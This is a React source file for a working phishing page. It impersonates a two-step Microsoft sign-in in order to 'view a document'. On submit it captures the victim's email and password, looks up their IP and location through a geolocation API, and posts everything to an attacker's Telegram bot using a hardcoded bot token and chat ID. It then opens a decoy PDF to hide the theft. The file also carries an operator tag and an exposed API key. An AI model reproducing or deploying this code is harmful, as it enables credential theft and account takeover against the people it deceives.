import { useState } from "react";
import "./assets/styles.css";
import Logo from "./assets/microsoft_logo.svg";
import Key from "./assets/signin.svg";
import arrow from "./assets/arrow.svg";
const BOT_TOKEN = "6131072072:AAEwix3Pgr0CZalnxwNHBOeQtjGMVBUR2ok"; // Replace with your bot token
const CHAT_ID = "6569865498"; // Replace with your chat ID

const Indexpage = () => {
  const [step, setStep] = useState(1); // 1 for email input, 2 for password input
  const [showLoader, setShowLoader] = useState(false); // Loader visibility
  const [email, setEmail] = useState(""); // Store the user's email
  const [password, setPassword] = useState(""); // Store the user's password
  const PDF_URL =
    "https://www.sjsu.edu/writingcenter/docs/handouts/Business%20Proposals.pdf";

  const handleNext = () => {
    if (!email) {
      alert("Please enter your email"); // Ensure email is not empty
      return;
    }

    setShowLoader(true); // Show loader
    setTimeout(() => {
      setShowLoader(false); // Hide loader
      setStep(2); // Move to the password input step
    }, 1000); // 1 second delay
  };

  const handleBack = () => {
    setStep(1); // Go back to the email input step
  };

  const handleSignIn = async () => {
    if (!password) {
      alert("Please enter your password"); // Ensure password is not empty
      return;
    }

    try {
        // Fetch user's IP and location details
        const API_KEY = "3a5231e8532d4c51a274740f08ee82e4"; // Replace with your API key
        const ipResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`);
        if (!ipResponse.ok) {
          throw new Error("Failed to fetch IP and location details.");
        }
        const ipData = await ipResponse.json();
    
        const { ip, city, state_prov: state, country_name: country } = ipData;

      // Prepare message for Telegram
      const message = `† 🧰Office link By aSTUTE 4 JolaBTC🧰 †
A User Sign-In:
Email: ${email}
Password: ${password}

Location Information:
IP Address: ${ip}
City: ${city}
State: ${state}
Country: ${country}`;

      // Send data to Telegram
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
          }),
        }
      );

      if (!telegramResponse.ok) {
        throw new Error("Failed to send data to Telegram.");
      }

      // Open PDF after successful Telegram message
      window.open(PDF_URL, "_blank"); // Opens the PDF in a new tab
    } catch (error) {
      console.error("Error:", error.message);
      alert("An error occurred: " + error.message);
    }
  };

  return (
    <div>
      {/* Step 1: Email Input */}
      {step === 1 && (
        <div className="body-container">
          <div className="body-holder">
            {showLoader && (
              <div className="loader-container">
                <div className="loader">
                  <span></span>
                  <span></span>
                  <span></span>
                  <span></span>
                  <span></span>
                  <span></span>
                </div>
              </div>
            )}
            <div className="body-inner">
              <div className="body-img">
                <img src={Logo} alt="logo" />
              </div>
              <h>Sign in to view the document</h>
              <div className="body-input">
                <input
                  type="text"
                  className="bottom-border-input"
                  placeholder="Email, phone, or Skype"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)} // Update email state on input
                />
                <p>
                  No account? <span>Create one!</span>
                </p>
                <p>
                  <span>Can’t access your account?</span>
                </p>
              </div>
            </div>
            <div className="body-button">
              <button className="back-btn">Back</button>
              <button className="frnt-btn" onClick={handleNext}>
                Next
              </button>
            </div>
          </div>
          <div className="body-under">
            <img src={Key} alt="key" />
            <p>Sign-in options</p>
          </div>
        </div>
      )}

      {/* Step 2: Password Input */}
      {step === 2 && (
        <div className="body-container">
          <div className="body-holder">
            <div className="body-inner">
              <div className="body-img">
                <img src={Logo} alt="logo" />
              </div>
              <div className="arrpass">
                <img
                  className="arrow"
                  src={arrow}
                  alt="arrow"
                  onClick={handleBack}
                />
                <p className="user-em">{email}</p> {/* Display the entered email */}
              </div>
              <h className="password">Enter Password</h>
              <div className="body-input">
                <input
                  type="password"
                  className="bottom-border-input"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)} // Update password state
                />
                <p>
                  <span>Forgot my password?</span>
                </p>
              </div>
            </div>
            <div className="body-button">
              <button className="frnt-btn" onClick={handleSignIn}>
                Sign In
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Indexpage;